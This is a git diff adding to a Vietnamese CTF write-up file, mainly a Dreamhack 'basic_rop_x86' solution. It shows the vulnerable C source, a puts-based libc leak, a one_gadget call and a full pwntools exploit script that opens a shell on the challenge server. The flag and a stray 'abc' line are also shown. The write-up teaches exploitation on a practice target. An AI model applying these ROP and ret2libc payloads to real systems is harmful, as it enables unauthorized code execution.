@@ -124,6 +124,8 @@ sau đó ta dùng tool [link](https://defuse.ca/) để đổi asm thành mã m�
 
 </details>
 
+---
+
 # out_of_bound
 
 ## source
@@ -252,6 +254,180 @@ r.sendlineafter(b"want?: ", b"19")
 
 r.interactive()
 # DH{2524e20ddeee45f11c8eb91804d57296}
+```
+
+</details>
+
+abc
+
+---
+
+# basic_rop_x86
+
+## source
+
+<details> <summary> source C </summary>
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <signal.h>
+#include <unistd.h>
+
+
+void alarm_handler() {
+    puts("TIME OUT");
+    exit(-1);
+}
+
+
+void initialize() {
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+
+    signal(SIGALRM, alarm_handler);
+    alarm(30);
+}
+
+int main(int argc, char *argv[]) {
+    char buf[0x40] = {};
+
+    initialize();
+
+    read(0, buf, 0x400);
+    write(1, buf, sizeof(buf));
+
+    return 0;
+}
+```
+
+</details>
+
+## Ý tưởng
+
+- Ở đây chúng ta không có hàm tạo system() cùng với đề bài chúng ta sẽ phải ret2libc nhưng với bản 32bit
+- Ở bản 32 bit việc ret2libc khá là khác so với 64bit, ban đầu em chưa thấy sự khác nhau nhưng sau một khoảng thời gian, em đọc wu về các bài ret2libc 32bit thì em thấy để leak được libc ta sẽ làm như sau:
+
+```
+payload = [140 bytes buffer] + [puts@plt] + [main()] + [puts@got]
+```
+
+## Khai thác
+
+### Bước 1: ta cần leak được địa chỉ libc, tính base libc
+
+- Để leak được base libc ta sẽ làm như `payload = [140 bytes buffer] + [puts@plt] + [main()] + [puts@got]` chỉ khác ở bao nhiêu byte buffer, ở đây em tính được 0x48 byte thì ow được saved rbp
+
+```python
+    pop_ebp = 0x0804868b            # em dung ROPgadget de lay pop ebp
+
+    payload = b"A"*0x48
+    payload += p32(exe.plt['puts'])
+    payload += p32(pop_ebp)
+    payload += p32(exe.got['puts'])
+    payload += p32(exe.sym['main'])
+    r.send(payload)
+```
+
+- Khi này ta leak được khoảng 4 địa chỉ
+  ![image](https://user-images.githubusercontent.com/111769169/227420546-a1953367-c8cf-490f-98b5-a8c6698d24ed.png)
+- Đến đây, ta sẽ unpack và ghi ra màn hình để kiểm tra
+
+```python
+r.recvuntil(b"A"*64)
+leak1 = u32(r.recv(4))
+leak2 = u32(r.recv(4))
+leak3 = u32(r.recv(4))
+leak4 = u32(r.recv(4))
+
+log.info("leak 1 " + hex(leak1))
+log.info("leak 2 " + hex(leak2))
+log.info("leak 3 " + hex(leak3))
+log.info("leak 4 " + hex(leak4))
+```
+
+- Ta nhận được như hình, ta có thể nhận giá trị leak 1, 3, 4 để tính base libc, ở đây e chọn leak 1 để tính base libc
+
+![image](https://user-images.githubusercontent.com/111769169/227421250-dad69508-910b-486d-9019-b4ad26384b7f.png)
+
+```python
+r.recvuntil(b"A"*64)
+leak1 = u32(r.recv(4))
+leak2 = u32(r.recv(4))
+leak3 = u32(r.recv(4))
+leak4 = u32(r.recv(4))
+libc.address = leak1 - 389440
+
+log.info("leak 1 " + hex(leak1))
+log.info("leak 2 " + hex(leak2))
+log.info("leak 3 " + hex(leak3))
+log.info("leak 4 " + hex(leak4))
+log.info("base libc " + hex(libc.address))
+```
+
+- Kiểm tra lại, thấy đuôi 000 chắc là đúng rồi =)))
+
+![image](https://user-images.githubusercontent.com/111769169/227422644-f52f900e-d1a7-4163-911a-eb9d438420e5.png)
+
+### One_gadget
+
+- Ở đây ta sử dụng one_gadget để tạo shell, sau khi kiểm tra em thấy shell thứ 3 thoả điều kiện nên em lấy lun
+
+![image](https://user-images.githubusercontent.com/111769169/227423024-73a0112c-f9ae-40b9-ba57-8e5ff5efd305.png)
+
+```python
+one_gadget = libc.address + 0x3a812
+payload2 = b"a" * 0x48 + p32(one_gadget)
+r.send(payload2)
+```
+
+## Kết quả
+
+![image](https://user-images.githubusercontent.com/111769169/227423486-a01ff46e-eb64-43cf-9e1c-1498e22b0a5b.png)
+
+<details> <summary> full script </summary>
+
+```python
+from pwn import *
+libc = ELF("./libc.so.6")
+exe = ELF("./basic_rop_x86_patched")
+r = remote("host3.dreamhack.games", 16535)
+# r = process(exe.path)
+# gdb.attach(r, gdbscript='''
+#            b*main+45
+#            c
+#            ''')
+input()
+pop_ebp = 0x0804868b
+
+payload = b"A"*0x48
+payload += p32(exe.plt['puts'])
+payload += p32(pop_ebp)
+payload += p32(exe.got['puts'])
+payload += p32(exe.sym['main'])
+r.send(payload)
+
+r.recvuntil(b"A"*64)
+leak1 = u32(r.recv(4))
+leak2 = u32(r.recv(4))
+leak3 = u32(r.recv(4))
+leak4 = u32(r.recv(4))
+libc.address = leak1 - 389440
+
+log.info("leak 1 " + hex(leak1))
+log.info("leak 2 " + hex(leak2))
+log.info("leak 3 " + hex(leak3))
+log.info("leak 4 " + hex(leak4))
+log.info("base libc " + hex(libc.address))
+
+one_gadget = libc.address + 0x3a812
+payload2 = b"a" * 0x48 + p32(one_gadget)
+r.send(payload2)
+
+r.interactive()
+
+# DH{ff3976e1fcdb03267e8d1451e56b90a5}
+
 ```
 
 </details>
